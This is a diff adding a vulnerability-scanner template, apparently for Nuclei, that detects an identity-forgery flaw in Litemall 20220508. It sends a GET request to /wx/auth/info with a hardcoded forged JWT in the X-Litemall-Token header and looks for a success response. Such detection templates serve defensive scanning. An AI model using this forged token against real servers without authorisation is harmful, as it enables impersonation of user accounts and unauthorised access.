@@ -1,0 +1,25 @@
+id: litemall-identity-forgery
+info:
+  name: Litemall 20220508 User Identity Forgery
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Litemall has an identity forgery vulnerability that allows attackers to forge user identities for unauthorized operations.
+  tags: permission-bypass
+http:
+  - raw:
+      - |
+        GET /wx/auth/info HTTP/1.1
+        Host: {{Hostname}}
+        X-Litemall-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0aGlzIGlzIGxpdGVtYWxsIHRva2VuIiwiYXVkIjoiTUlOSUFQUCIsImlzcyI6IkxJVEVNQUxMIiwiZXhwIjo0Nzc2MTQ2NzQ5LCJ1c2VySWQiOjEsImlhdCI6MTY1MjAwMTk0OX0.0nWPj0ckkD8fZ9AuRwQ8hXtOSgSTHK3bfTL4-Y7itok
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "nickName"
+          - "成功"
+          - "\"errno\":0"
+        part: body
